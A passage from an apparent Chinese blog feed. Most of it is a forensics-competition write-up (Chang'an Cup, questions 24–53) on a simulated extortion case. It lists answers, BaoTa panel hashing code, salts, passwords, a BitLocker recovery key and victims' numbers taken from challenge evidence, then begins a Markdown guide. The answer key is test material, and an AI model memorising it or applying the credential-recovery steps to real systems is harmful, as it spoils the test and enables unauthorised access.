href="#24-嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：">¶</a>24. 嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：</h4><ul><li>hl123</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-6.png" alt="alt text"></p><h4 id="25-请分析用于重置宝塔面板密码的函数名为"><a class="header-anchor" href="#25-请分析用于重置宝塔面板密码的函数名为">¶</a>25. 请分析用于重置宝塔面板密码的函数名为</h4><ul><li><a href="/2025/10/13/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E7%9F%A5%E8%AF%86%E7%82%B9">框架知识点</a></li><li><a href="http://xn--tools-776h045ahsgukal20gsgdbx0djydlog7xm73rcoa05u7x2dwgyam6z.py">宝塔面板重置网站密码功能调用的是tools.py</a></li><li>宝塔后台数据库叫default.db</li><li>宝塔的工具面板的代码是在/www/server/panel下面，直接火眼文件里找</li><li>.py后缀有两个文件</li><li>test.py和tool.py中看到同样内容：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置面板密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_panel_pwd</span>(<span class="params">password,ncli = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">import</span> db</span><br><span class="line">    sql = db.Sql()</span><br><span class="line">    result = sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).setField(<span class="string">&#x27;password&#x27;</span>,public.password_salt(public.md5(password),uid=<span class="number">1</span>))</span><br><span class="line">    username = sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).getField(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ncli:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-用户名: &quot;</span> + username)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-新密码: &quot;</span> + password)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(username)</span><br></pre></td></tr></table></figure><ul><li>set_panel_pwd</li></ul><h4 id="26-请分析宝塔面板登陆密码的加密方式所使用的哈希算法为"><a class="header-anchor" href="#26-请分析宝塔面板登陆密码的加密方式所使用的哈希算法为">¶</a>26. 请分析宝塔面板登陆密码的加密方式所使用的哈希算法为</h4><ul><li>md5 24题已知</li></ul><h4 id="27-请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法"><a class="header-anchor" href="#27-请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法">¶</a>27. 请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法</h4><ul><li>3次</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置面板密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_panel_pwd</span>(<span class="params">password,ncli = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">import</span> db</span><br><span class="line">    sql = db.Sql()</span><br><span class="line">    result = sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).setField(<span class="string">&#x27;password&#x27;</span>,public.password_salt(public.md5(password),uid=<span class="number">1</span>))</span><br><span class="line">    username = sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).getField(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ncli:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-用户名: &quot;</span> + username)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-新密码: &quot;</span> + password)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(username)</span><br></pre></td></tr></table></figure><ul><li>发现这里调用了public类的md5方法，在/www/server/panel/class里面可以找到public.py,导出搜索password：</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">password_salt</span>(<span class="params">password,username=<span class="literal">None</span>,uid=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        @name 为指定密码加盐</span></span><br><span class="line"><span class="string">        @author hwliang&lt;2020-07-08&gt;</span></span><br><span class="line"><span class="string">        @param password string(被md5加密一次的密码)</span></span><br><span class="line"><span class="string">        @param username string(用户名) 可选</span></span><br><span class="line"><span class="string">        @param uid int(uid) 可选</span></span><br><span class="line"><span class="string">        @return string</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    chdck_salt()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> uid:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;username或uid必需传一项&#x27;</span>)</span><br><span class="line">        uid = M(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;username=?&#x27;</span>,(username,)).getField(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    salt = M(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(uid,)).getField(<span class="string">&#x27;salt&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> md5(md5(password+<span class="string">&#x27;_bt.cn&#x27;</span>)+salt)</span><br></pre></td></tr></table></figure><h4 id="28-请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】"><a class="header-anchor" href="#28-请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】">¶</a>28. 请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】</h4><ul><li>v87ilhAVumZL 24题已得</li><li>打开宝塔面板数据库/www/server/panel/default.db，在user表中也看</li></ul><h4 id="29-请分析该服务器，网站源代码所在的绝对路径为"><a class="header-anchor" href="#29-请分析该服务器，网站源代码所在的绝对路径为">¶</a>29. 请分析该服务器，网站源代码所在的绝对路径为</h4><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-13.png" alt="alt text"></p><h4 id="30-请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材五，并重构网站）【标准格式：111-111-111-111】：192-168-110-115-CAB2021"><a class="header-anchor" href="#30-请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材五，并重构网站）【标准格式：111-111-111-111】：192-168-110-115-CAB2021">¶</a>30. 请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材五，并重构网站）【标准格式：111.111.111.111】：192.168.110.115-CAB2021</h4><ul><li>/www/wwwroot/www.honglian7001/app/databae.php</li><li>遍历网站文件，找数据库文件</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-14.png" alt="alt text"></p><ul><li>192.168.110.115</li></ul><h4 id="31-请分析，数据库的登陆密码为【区分大小写】"><a class="header-anchor" href="#31-请分析，数据库的登陆密码为【区分大小写】">¶</a>31. 请分析，数据库的登陆密码为【区分大小写】</h4><ul><li>30题已得</li><li>wxrM5GtNXk5k5EPX</li></ul><h4 id="32-请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：-web】【待-问题未解答】"><a class="header-anchor" href="#32-请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：-web】【待-问题未解答】">¶</a>32. 请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：/web】【待 问题未解答】</h4><ul><li>RStudioProtable-打开镜像导入文件，新建虚拟快RAID和自动检测，拖拽镜像文件，自动检测</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-15.png" alt="alt text"></p><ul><li>火眼依据信息导入</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-16.png" alt="alt text"></p><ul><li>问我要密码？我又不知道。。。估计火眼仿真默认改123456了账户就用root不然网站无法重构！！！</li></ul><h4 id="33-请分析该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】"><a class="header-anchor" href="#33-请分析该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】">¶</a>33. 请分析该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】</h4><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-34.png" alt="alt text"></p><ul><li>lshi4AsSUrUOwWV</li></ul><h4 id="34-请分析该网站的管理员用户的密码为："><a class="header-anchor" href="#34-请分析该网站的管理员用户的密码为：">¶</a>34. 请分析该网站的管理员用户的密码为：</h4><ul><li>登录宝塔，<a href="/2025/10/19/%E5%AE%9D%E5%A1%94%E5%91%BD%E4%BB%A4">常用命令</a></li><li><figure class="highlight plaintext"><figcaption><span>defalt```获得为默认密码，不显示更改后密码！！！</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![alt text](/img/第三届长安杯笔记_6-35.png)</span><br><span class="line">- 对应案发时间，只有 202104 这个时间是比较符合的，在这个文件夹下只有两个日志，我们打开搜索 password 就可以找到只有两个密码，分别是 123456 和 security ，对应用户名都是 admin，我们只需要在刚刚重构好的登录界面尝试哪个密码可以登录到后台，哪个密码就是本题的答案（security）</span><br><span class="line"></span><br><span class="line">#### 35. 在对后台账号的密码加密处理过程中，后台一共计算几次哈希值</span><br><span class="line">- 见33题图，原密码md5拼接salt值的md5，拼接的结果再进行一次md5，一共3次</span><br><span class="line"></span><br><span class="line">#### 36. 请统计，后台中，一共有多少条设备记录</span><br><span class="line"></span><br><span class="line">![alt text](/img/第三届长安杯笔记_6-36.png)</span><br><span class="line">#### 37. 请通过后台确认，本案中受害者的手机号码为</span><br><span class="line">- 小白鼠.txt里面查看</span><br><span class="line"></span><br><span class="line">![alt text](/img/第三届长安杯笔记_6-33.png)</span><br><span class="line">- 设备18644099137通讯录</span><br><span class="line"></span><br><span class="line">#### 38. 请分析，本案中受害者的通讯录一共有多少条记录</span><br><span class="line">- 小白鼠.txt里面查看，上题已得：34</span><br><span class="line"></span><br><span class="line">### 通过对检材二和三进行分析，警方通过IP落地，警方掌成功抓获犯罪嫌疑人，现将嫌疑人的PC机和手机进行了取证，分别制作了镜像，请使用第13题的答案对检材四进行解密，并回答下列问题（192.168.110.203-CAB2021）</span><br><span class="line"></span><br><span class="line">#### 39. 请计算检材四-PC的原始硬盘的SHA256值</span><br><span class="line"></span><br><span class="line">![alt text](/img/第三届长安杯笔记_6-8.png)</span><br><span class="line">#### 40. 请分析，检材四-PC的Bitlocker加密分区的解密密钥为</span><br><span class="line"></span><br><span class="line">![alt text](/img/第三届长安杯笔记_6-7.png)</span><br><span class="line">```txt</span><br><span class="line">BitLocker 驱动器加密恢复密钥*要验证这是否为正确的恢复密钥，请将以下标识符的开头与电脑上显示的标识符值进行比较。标识符: 3BC73D1D-E5B0-4592-B9D6-42D0A306B625如果以上标识符与电脑显示的标识符匹配，则使用以下密钥解锁你的驱动器。恢复密钥: 511126-518936-161612-135234-698357-082929-144705-622578如果以上标识符与电脑显示的标识符不匹配，则该密钥不是解锁你的驱动器的正确密钥。请尝试其他恢复密钥，或参阅 https://go.microsoft.com/fwlink/?LinkID=260589 以获得其他帮助。</span><br></pre></td></tr></table></figure></li><li>注意：Bitlocker解密后火眼要全部重新分析！！！</li></ul><h4 id="41-请分析，检材四-PC的开机密码为"><a class="header-anchor" href="#41-请分析，检材四-PC的开机密码为">¶</a>41. 请分析，检材四-PC的开机密码为</h4><ul><li>39题已知</li></ul><h4 id="42-经分析发现，检材四-PC是嫌疑人用于管理服务器的设备，其主要通过哪个浏览器控制网站后台"><a class="header-anchor" href="#42-经分析发现，检材四-PC是嫌疑人用于管理服务器的设备，其主要通过哪个浏览器控制网站后台">¶</a>42. 经分析发现，检材四-PC是嫌疑人用于管理服务器的设备，其主要通过哪个浏览器控制网站后台</h4><ul><li>chrome</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-17.png" alt="alt text"></p><h4 id="43-请计算PC检材中用户目录下的zip文件的sha256值"><a class="header-anchor" href="#43-请计算PC检材中用户目录下的zip文件的sha256值">¶</a>43. 请计算PC检材中用户目录下的zip文件的sha256值</h4><ul><li>搜索得到users目录位置</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-19.png" alt="alt text"></p><ul><li>目录内搜索zip，创建任务</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-18.png" alt="alt text"></p><ul><li>0DD2C00C8C6DBDEA123373F91A3234D2F07D958355F6CD7126E397E12E8ADBB3</li></ul><h4 id="44-请分析检材四-phone，该手机的IMEI号为"><a class="header-anchor" href="#44-请分析检材四-phone，该手机的IMEI号为">¶</a>44. 请分析检材四-phone，该手机的IMEI号为</h4><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-9.png" alt="alt text"></p><h4 id="45-请分析检材四-phone，嫌疑人和本案受害者是通过什么软件开始接触的【标准格式：支付宝】"><a class="header-anchor" href="#45-请分析检材四-phone，嫌疑人和本案受害者是通过什么软件开始接触的【标准格式：支付宝】">¶</a>45. 请分析检材四-phone，嫌疑人和本案受害者是通过什么软件开始接触的【标准格式：支付宝】</h4><ul><li>伊对</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-22.png" alt="alt text"></p><h4 id="46-请分析检材四-phone，受害者下载恶意APK安装包的地址为"><a class="header-anchor" href="#46-请分析检材四-phone，受害者下载恶意APK安装包的地址为">¶</a>46. 请分析检材四-phone，受害者下载恶意APK安装包的地址为</h4><ul><li>45题两聊天记录下面就是</li><li><a href="https://cowtransfer.com/s/a6b28b4818904c">https://cowtransfer.com/s/a6b28b4818904c</a></li></ul><h4 id="47-请分析检材四-phone，受害者的微信内部ID号为"><a class="header-anchor" href="#47-请分析检材四-phone，受害者的微信内部ID号为">¶</a>47. 请分析检材四-phone，受害者的微信内部ID号为</h4><ul><li>wxid_op8i06j0aano22</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-24.png" alt="alt text"></p><h4 id="48-请分析检材四-phone，嫌疑人用于敲诈本案受害者的QQ账号为"><a class="header-anchor" href="#48-请分析检材四-phone，嫌疑人用于敲诈本案受害者的QQ账号为">¶</a>48. 请分析检材四-phone，嫌疑人用于敲诈本案受害者的QQ账号为</h4><ul><li>1649840939</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-26.png" alt="alt text"></p><h4 id="49-请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为"><a class="header-anchor" href="#49-请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为">¶</a>49. 请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为</h4><ul><li>43题zip解压，密码为12306，与账密相同，当然也可以暴力破解，但注意暴力的位数5</li><li>火眼仿真获得密码money</li><li>打开此电脑快速访问</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-28.png" alt="alt text"></p><ul><li>VC挂载，key.rar作为密匙文件</li><li>嫌疑人用于管理敲诈对象的容器文件是小白鼠.txt</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-31.png" alt="alt text"></p><ul><li>9C4BE29EB5661E6EDD88A364ECC6EF004C15D61B08BD7DD0A393340180F15608</li><li>但为什么小白鼠.txt导出后这么算哈希值不一样？？？</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-31-1.png" alt="alt text"></p><h4 id="50-请综合分析嫌疑人检材，另外一受害者-郭先生-的手机号码为"><a class="header-anchor" href="#50-请综合分析嫌疑人检材，另外一受害者-郭先生-的手机号码为">¶</a>50. 请综合分析嫌疑人检材，另外一受害者&quot;郭先生&quot;的手机号码为</h4><ul><li>15266668888</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-29.png" alt="alt text"></p><h4 id="51-通过嫌疑人检材，其中记录了几位受害者的信息"><a class="header-anchor" href="#51-通过嫌疑人检材，其中记录了几位受害者的信息">¶</a>51. 通过嫌疑人检材，其中记录了几位受害者的信息</h4><ul><li>5</li></ul><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-30.png" alt="alt text"></p><h4 id="52-请使用第11题的密码解压-金先生转账-zip-文件，并对压缩包中的文件计算SHA256值"><a class="header-anchor" href="#52-请使用第11题的密码解压-金先生转账-zip-文件，并对压缩包中的文件计算SHA256值">¶</a>52. 请使用第11题的密码解压&quot;金先生转账.zip&quot;文件，并对压缩包中的文件计算SHA256值</h4><ul><li>11题：c74d97b01eae257e44aa9d5bade97baf</li><li>cd62a83690a53e5b441838bc55ab83be92ff5ed26ec646d43911f119c15df510</li><li>hashcalc算</li></ul><h4 id="53-请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）【未解决】"><a class="header-anchor" href="#53-请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）【未解决】">¶</a>53. 请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）【未解决】</h4><ul><li>伊对1000<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-25.png" alt="alt text"></li><li>微信2000<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-21.png" alt="alt text"></li><li>QQ<ul><li>600 + 【2笔转账记录我都已经保存好了/悠闲】<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-27.png" alt="alt text"></li><li>打不开图片<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-32.png" alt="alt text"></li></ul></li><li>&quot;金先生转账.zip&quot;文件<ul><li>2000 交易时间：2021-04-24 18:30:25</li></ul></li><li><strong>数据库里面还有个？！</strong></li><li>navicat连接，导出成txt，厨子魔法棒可以发现是base64编码过的jpg图片，解码后保存为图片就能正常查看，有1000元<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-39.png" alt="alt text"><br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-38.png" alt="alt text"><br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E7%AC%94%E8%AE%B0_6-37.png" alt="alt text"></li></ul><h3 id="总体分析："><a class="header-anchor" href="#总体分析：">¶</a>总体分析：</h3><ul><li>数字是192.168.110.后第四段数字<ul><li>A 受害者252</li><li>B apk回传数据的服务器 负责转发的服务器203</li><li>C D E 建数据库的宝塔，三个转发对象111 112 113</li><li>F window ssh连接三个对象</li></ul></li><li>192.168.110开头的IP地址属于私有地址段，通常作为路由器管理后台的默认网关。所以这几个ip在这个这个服务器集群里面是一直使用并代表所在服务器使用</li></ul>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown-github+vscode使用文档</title>
      <link href="/2025/10/01/markdown-github-vscode%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/"/>
      <url>/2025/10/01/markdown-github-vscode%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="常用hexo命令"><a class="header-anchor" href="#常用hexo命令">¶</a>常用hexo命令</h2><ul><li>本地预览</li></ul><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><h2 id="引用博客内文章"><a class="header-anchor" href="#引用博客内文章">¶</a>引用博客内文章</h2><ul><li>[显示文字](/2025/10/日期/文字名称)</li><li>例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[框架知识点](/2025/10/13/宝塔面板知识点)</span><br></pre></td></tr></table></figure><ul><li>效果：<a href="/2025/10/13/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E7%9F%A5%E8%AF%86%E7%82%B9">框架知识点</a></li></ul><h2 id="快捷键"><a class="header-anchor" href="#快捷键">¶</a>快捷键</h2><ul><li>Markdown All in One 插件支持许多 Markdown 语法的快捷键，使得格式化文本、插入链接、图片和其他元素变得非常简单。</li></ul><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center"><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">快捷键</th><th style="text-align:center">操作</th><th style="text-align:center">快捷键</th></tr></thead><tbody><tr><td style="text-align:center">加粗</td><td style="text-align:center">Ctrl + B</td><td style="text-align:center">撤销</td><td style="text-align:center">Ctrl + Z</td></tr><tr><td style="text-align:center">斜体</td><td style="text-align:center">Ctrl + I</td><td style="text-align:center">重做</td><td style="text-align:center">Ctrl + Y</td></tr><tr><td style="text-align:center">删除线</td><td style="text-align:center">Alt + S</td><td style="text-align:center">标题(uplevel)</td><td style="text-align:center">Ctrl + Shift + ]</td></tr><tr><td style="text-align:center">Toggle math environment</td><td style="text-align:center">Ctrl + M</td><td style="text-align:center">标题(downlevel)</td><td style="text-align:center">Ctrl + Shift + [</td></tr><tr><td style="text-align:center">Check/Uncheck task list item</td><td style="text-align:center">Alt + C</td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table></div><h2 id="目录和标题"><a class="header-anchor" href="#目录和标题">¶</a>目录和标题</h2><ul><li>（Github 版）如果使用 [TOC] 命令来生成目录，需要下载 “Markdown TOC” 插件。（未实践）</li><li>在 Github 版上不下载 Markdown TOC 插件创建目录的方法：按下快捷键 Ctrl + Shift + P 调出命令框，输入 Markdown ，找到 “Markdown All in One：创建目录” 即可。</li><li>使用 # 符号来创建标题。一个 # 是一级标题，两个 # 是二级标题，以此类推，最多六级。</li></ul><h2 id="文本样式"><a class="header-anchor" href="#文本样式">¶</a>文本样式</h2><ul><li>使用 * 或 _ 包围的文本会变为<strong>斜体</strong>。</li><li>使用 ** 或 __ 包围的文本会被<strong>加粗</strong>。</li><li>使用 *** 或 ___ 包围的文本会变为<strong>粗斜体</strong>。</li><li>使用 ~~ 包围的文本会被<strong>横线删除</strong>。</li><li>（Github 版）使用 &lt;mark&gt; 和 &lt;/mark&gt; 包围的文本会被<strong>高亮</strong>。</li><li>在 &gt; 后的文本会被<strong>引用</strong>。</li><li>（Github 版）使用 &lt;sub&gt; 和 &lt;/sub&gt; 包围的文本会变为<strong>下标</strong>。</li><li>（Github 版）使用 &lt;sup&gt; 和 &lt;/sup&gt; 包围的文本会变为<strong>上标</strong>。</li><li>使用 &lt;u&gt; 和 &lt;/u&gt; 包围的文本会出现<strong>下划线</strong>。</li><li>输入 *** 后回车，即可添加<strong>分隔线</strong>。</li><li>编写<strong>不被渲染输出</strong>的内容：&lt;!–文本–&gt;</li><li>在文本前使用 &amp;emsp;&amp;emsp; 代表在文本前按下一次<strong>Tab 键</strong>。</li><li>若需要空一行，按下回车键即可；若需要空多行，则需要在每一行空行处添加 &amp;emsp;&amp;emsp; 。</li><li>若需要添加在 Markdown 中具有特殊意义的字符，在该符号前添加 \ 即可。</li></ul><h2 id="列表"><a class="header-anchor" href="#列表">¶</a>列表</h2><ul><li>使用 - 或 * 或 + 加空格来创建无序列表。</li><li>使用数字加 . 后加空格来创建有序列表。</li><li>使用 - [ ] 后加空格来创建待办列表，使用 - [x] 进行打勾（字母 x 或 X）。</li></ul><h2 id="图片"><a class="header-anchor" href="#图片">¶</a>图片</h2><ul><li>使用 ![替代文本](图片地址) 来插入图片。<ul><li>带尺寸的图片：! [图片名称] (图片路径/1.png =60×60)</li><li>宽度确定高度等比例的图片：! [图片名称] (图片路径/1.png =60×)</li><li>高度确定宽度等比例的图片：! [图片名称] (图片路径/1.png =×60)</li><li>居中的图片：! [图片名称] (图片路径/1.png#pic_center)<br>居左：#pic_left ，居右：#pic_right<br>居中并且带尺寸的图片：! [图片名称] (图片路径/1.png#pic_center =60×60)</li></ul></li></ul><h2 id="链接"><a class="header-anchor" href="#链接">¶</a>链接</h2><ul><li>使用 &lt;链接地址&gt; 直接显示网站链接。</li><li>使用 [显示文本](链接地址) 来创建超链接，显示文本会代替连接出现。</li></ul><h2 id="代码"><a class="header-anchor" href="#代码">¶</a>代码</h2><ul><li>使用反引号插入单行代码，使用三个反引号创建代码块。</li><li>段首键入 Tab 键或输出 4 个空格，即可添加代码块。</li><li>段落前后添加三个反引号，即可将中间段落识别为代码块；若要在正文中键入代码，则在代码前后添加一个反引号。</li><li>需要代码高亮时，在段落前的三个反引号后添加语言名称，如 python ，即可高亮显示代码块。</li></ul><h2 id="表格"><a class="header-anchor" href="#表格">¶</a>表格</h2><ul><li>左对齐：|:–| ，右对齐：|--:| ，居中对齐：|:--:| 。</li><li>可以在表格中设置文本格式。例如可以添加链接，代码（仅反引号（`）中的单词或短语，而不是代码块）和强调；但是不能添加标题，块引用，列表，水平规则，图像或 HTML 标签。</li><li>可以使用表格的 HTML 字符代码 | 在表中显示竖线 | 字符。</li><li>表格居中代码</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 让表格居中显示的风格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.center</span> </span></span><br><span class="line"><span class="language-css">&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: table;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-left</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-right</span>: auto;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span> <span class="attr">size</span>=<span class="string">2.</span>&gt;</span>表1 示例表格<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">|   序号   |   内容  |        描述         |</span><br><span class="line">|  :---:  |  :---:  |  :---------------:  |</span><br><span class="line">|    1    |    l    |  大写字母L的小写字母l |</span><br><span class="line">|    2    |    I    |      大写字母I       |</span><br><span class="line">|    3    |    1    |        数字1       |</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>效果：</li></ul><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><p align="center"><font face="黑体" size=2.>表1 示例表格</font></p><div class="center"><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">内容</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">l</td><td style="text-align:center">大写字母L的小写字母l</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">I</td><td style="text-align:center">大写字母I</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">1</td><td 